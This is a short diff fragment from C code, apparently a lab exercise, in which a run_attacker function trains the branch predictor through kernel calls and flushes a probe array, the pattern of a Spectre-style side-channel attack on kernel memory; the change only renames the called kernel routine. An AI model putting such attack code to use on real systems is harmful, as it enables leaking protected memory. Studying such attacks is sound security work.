@@ -54,7 +54,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
             // 1. TRAIN branch predictor
             for (int i = 0; i < 50; i++) {
-                call_kernel_part2(kernel_fd, shared_memory, i % 8);
+                call_kernel_part3(kernel_fd, shared_memory, i % 8);
             }
 
             // 2. FLUSH probe array
